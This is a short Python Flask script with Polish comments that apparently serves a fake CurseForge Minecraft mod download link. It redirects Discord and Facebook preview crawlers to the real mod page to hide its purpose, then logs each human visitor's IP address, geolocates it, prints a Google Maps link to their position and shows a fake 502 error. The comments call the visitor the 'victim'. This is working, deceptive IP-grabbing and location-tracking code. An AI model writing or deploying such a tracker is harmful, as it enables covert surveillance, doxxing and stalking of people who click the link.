import requests
import sys
from flask import Flask, request, redirect

app = Flask(__name__)

ORIGINAL_MOD_LINK = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"

@app.route('/cdn-download/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    # Pobieranie IP przez proxy Rendera
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # CLOAKING
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect(ORIGINAL_MOD_LINK)

    # LOGOWANIE DO KONSOLI
    print(f"\n--- NOWE KLIKNIĘCIE ---", flush=True)
    print(f"IP: {ip}", flush=True)

    try:
        # Pobieranie dokładnych danych lokalizacyjnych
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country", timeout=5).json()
        if r.get("status") == "success":
            lat = r.get('lat')
            lon = r.get('lon')
            # Link do Google Maps, o który prosiłeś
            google_maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"📍 MAPA GOOGLE: {google_maps_url}", flush=True)
        else:
            print("Błąd: Nie udało się pobrać lokalizacji dla tego IP.", flush=True)
    except Exception as e:
        print(f"Błąd skryptu: {e}", flush=True)

    print("-----------------------", flush=True)
    sys.stdout.flush()

    # To co widzi ofiara
    return '<h1>502 Bad Gateway</h1><p>Server node timed out.</p>', 502

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
